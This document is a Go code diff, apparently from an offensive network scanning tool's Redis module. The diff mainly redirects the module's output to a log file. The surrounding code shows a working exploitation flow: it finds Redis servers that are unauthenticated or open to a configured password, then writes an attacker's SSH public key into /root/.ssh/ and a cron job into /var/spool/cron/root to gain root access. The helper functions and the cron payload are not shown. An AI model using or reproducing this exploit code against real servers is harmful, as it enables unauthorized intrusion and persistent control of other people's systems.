@@ -10,7 +10,16 @@ import (
 	"time"
 )
 
-func RedisScan(info *config.HostData)(tmperr error){
+func REDISEXTENDSHELL(info *config.HostData){
+	_, err := redisConn(info,config.REDISFLAG.PassWord)
+	if err != nil {
+		//fmt.Println("[-]",err)
+		config.WriteLogFile(config.LogFile,"[-] "+err.Error(),config.Inlog)
+
+	}
+}
+
+func REDISSCAN(info *config.HostData)(tmperr error){
 	starttime := time.Now().Unix()
 	flag, err := RedisUnauth(info)
 	if flag == true && err == nil {
@@ -57,7 +66,8 @@ func redisConn(info *config.HostData, pass string) (flag bool, err error) {
 	}
 	if strings.Contains(reply, "+OK") {
 		result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
-		fmt.Println(result)
+		//fmt.Println(result)
+		config.WriteLogFile(config.LogFile,result,config.Inlog)
 		flag = true
 		err = Expoilt(realhost, conn)
 	}
@@ -86,7 +96,8 @@ func RedisUnauth(info *config.HostData) (flag bool, err error) {
 	}
 	if strings.Contains(reply, "redis_version") {
 		result := fmt.Sprintf("[+] %s [Redis unauthorized]", realhost)
-		fmt.Println(result)
+		//fmt.Println(result)
+		config.WriteLogFile(config.LogFile,result,config.Inlog)
 		flag = true
 		err = Expoilt(realhost, conn)
 	}
@@ -103,25 +114,27 @@ func Expoilt(realhost string, conn net.Conn) error {
 	}
 	if flagSsh == true {
 		result := fmt.Sprintf("[+] Redis:%v like can write /root/.ssh/", realhost)
-		fmt.Println(result)
+		config.WriteLogFile(config.LogFile,result,config.Inlog)
 		if config.RedisFile != "" {
 			writeok, text, err := writekey(conn, config.RedisFile)
 			if err != nil {
-				fmt.Println(fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text))
+				//fmt.Println(fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text))
+				config.WriteLogFile(config.LogFile,fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text),config.Inlog)
 				return err
 			}
 			if writeok {
 				result := fmt.Sprintf("[+] %v SSH public key was written successfully", realhost)
-				fmt.Println(result)
+				config.WriteLogFile(config.LogFile,result,config.Inlog)
 			} else {
-				fmt.Println("Redis:", realhost, "SSHPUB write failed", text)
+				//fmt.Println("Redis:", realhost, "SSHPUB write failed", text)
+				config.WriteLogFile(config.LogFile,"Redis: "+realhost+" SSHPUB write failed "+text,config.Inlog)
 			}
 		}
 	}
 
 	if flagCron == true {
 		result := fmt.Sprintf("[+] Redis:%v like can write /var/spool/cron/", realhost)
-		fmt.Println(result)
+		config.WriteLogFile(config.LogFile,result,config.Inlog)
 		if config.RedisShell != "" {
 			writeok, text, err := writecron(conn, config.RedisShell)
 			if err != nil {
@@ -129,9 +142,11 @@ func Expoilt(realhost string, conn net.Conn) error {
 			}
 			if writeok {
 				result := fmt.Sprintf("[+] %v /var/spool/cron/root was written successfully", realhost)
-				fmt.Println(result)
+				//fmt.Println(result)
+				config.WriteLogFile(config.LogFile,result,config.Inlog)
 			} else {
-				fmt.Println("[-] Redis:", realhost, "cron write failed", text)
+				//fmt.Println("[-] Redis:", realhost, "cron write failed", text)
+				config.WriteLogFile(config.LogFile,"[-] Redis: "+realhost+" cron write failed "+text,config.Inlog)
 			}
 		}
 	}
